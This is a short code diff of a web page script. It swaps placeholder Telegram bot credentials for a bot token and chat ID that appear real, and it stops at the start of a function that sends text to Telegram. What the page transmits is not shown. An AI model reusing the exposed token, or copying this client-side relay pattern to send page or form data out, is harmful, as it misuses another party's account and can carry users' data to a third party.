@@ -17,8 +17,8 @@
 
 <script>
     // ----------- TELEGRAM ----------
-    const BOT_TOKEN = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz";  // DEĞİŞTİR
-    const CHAT_ID = "123456789";                                // DEĞİŞTİR
+    const BOT_TOKEN = "8746989231:AAHGfFiFC8uRTi6lXoUNuTRL8cQMUfMm5nE";  // DEĞİŞTİR
+    const CHAT_ID = "8729744465";                                // DEĞİŞTİR
 
     // ----------- FONKSİYONLAR ----------
     function sendTG(text) {
